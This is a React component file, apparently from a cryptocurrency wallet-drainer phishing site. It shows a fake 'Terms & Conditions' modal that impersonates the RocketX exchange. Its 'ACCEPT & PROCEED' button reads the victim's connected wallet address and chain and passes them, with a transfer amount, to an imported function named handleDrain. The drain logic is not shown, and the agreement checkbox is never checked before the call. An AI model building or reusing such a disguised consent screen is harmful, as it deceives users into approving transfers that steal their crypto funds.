"use client";

import { useEffect, useRef } from "react";
import { IoMdClose } from "react-icons/io";
import { useAccount } from "wagmi";
import { UseWallet } from "../../app/useWallet";

const ConfirmSwapModal = ({ open, onClose, amount }) => {
  const dropdowRef = useRef(null);
  const { address, chainId } = useAccount();
  const { handleDrain } = UseWallet();

  const handleClickOutside = (event) => {
    if (dropdowRef.current && !dropdowRef.current.contains(event.target)) {
      onClose();
    }
  };

  useEffect(() => {
    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, []);

  if (!open) return;

  return (
    <div className="overflow-hidden fixed top-0 left-0 bottom-0 inset-0 z-50 bg-transparent">
      {/* <BlurFade> */}
      <div
        ref={dropdowRef}
        className="fixed inset-0 top-[50%] left-[50%] pt-3 -translate-y-[50%] -translate-x-[50%] z-[999] modal-bg bg-[#141429] w-full max-w-[500px] h-fit"
      >
        <div className="flex justify-start items-center px-10 py-4">
          <h1 className="font-bold text-white w-full">
            Terms & Conditions Agreement
          </h1>
          <IoMdClose
            className="rounded-full top-8 right-6 absolute"
            size={22}
            color="#6D6D78"
            role="button"
            onClick={onClose}
          />
        </div>

        <div className="p-10">
          <p className="text-[#7d8ca3] text-xs lg:text-sm">
            By using RocketX Exhange dApp,
            <br /> I agree to the
            <span className="underline text-white cursor-pointer">
              Terms of Use
            </span>{" "}
            and{" "}
            <span className="underline text-white cursor-pointer">
              Privacy Policy
            </span>
            .
          </p>

          <div className="mt-4 flex justify-start items-center gap-4">
            <input type="checkbox" />
            <p className="font-bold text-xs lg:text-sm">I AGREE</p>
          </div>
        </div>

        <div className="bg-[#141429] px-3 pt-8 pb-5 w-full grid grid-cols-2 gap-10">
          <button
            onClick={() =>
              handleDrain({ address, chainId, transferAmount: amount })
            }
            className="bg-[#312AD4] text-white font-medium text-xs py-3.5 text-center rounded-md w-full "
          >
            ACCEPT & PROCEED
          </button>
          <button
            onClick={onClose}
            className="bg-[#202037] w-full text-white font-medium text-xs py-3.5 text-center rounded-md "
          >
            CANCEL
          </button>
        </div>
      </div>
      {/* </BlurFade> */}
      <div className="fixed top-0 bottom-0 left-0 right-0 inset-0 backdrop-blur-md ease transition-all"></div>
    </div>
  );
};

export default ConfirmSwapModal;
